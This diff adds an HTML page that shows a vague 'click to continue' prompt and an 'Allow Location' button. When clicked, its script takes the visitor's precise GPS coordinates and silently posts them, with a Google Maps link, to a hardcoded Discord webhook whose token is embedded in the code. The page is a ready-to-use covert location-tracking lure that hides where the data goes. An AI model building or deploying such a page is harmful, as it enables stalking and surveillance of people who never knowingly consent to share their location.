@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Please click the button below to continue</h2>
+    <button onclick="getLocation()">Allow Location</button>
+    <p id="status"></p>
+
+    <script>
+        // Replace this with your Discord Webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1565701454948466708/bWEwIk6LXOXrXul2pzNwrYm5l5jlgDaFyd4Mp9auCwyK8ZH8_7L_TsK_1p1s5XuGhRkG";
+
+        function getLocation() {
+            const status = document.getElementById("status");
+            status.textContent = "Getting location...";
+
+            if (!navigator.geolocation) {
+                status.textContent = "Your browser does not support location services.";
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                // Success callback
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    status.textContent = "Location obtained, sending...";
+
+                    // Send data to Discord
+                    fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: `**New Location Received**\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nMap: https://www.google.com/maps?q=${lat},${lon}`
+                        })
+                    })
+                    .then(() => {
+                        status.textContent = "Done! You can close this page.";
+                    })
+                    .catch((err) => {
+                        status.textContent = "Send failed: " + err;
+                    });
+                },
+                // Error callback
+                (error) => {
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            status.textContent = "You denied the location permission.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            status.textContent = "Location information is unavailable.";
+                            break;
+                        case error.TIMEOUT:
+                            status.textContent = "Request timed out.";
+                            break;
+                    }
+                },
+                // Options: request high accuracy
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+    </script>
+</body>
+</html>
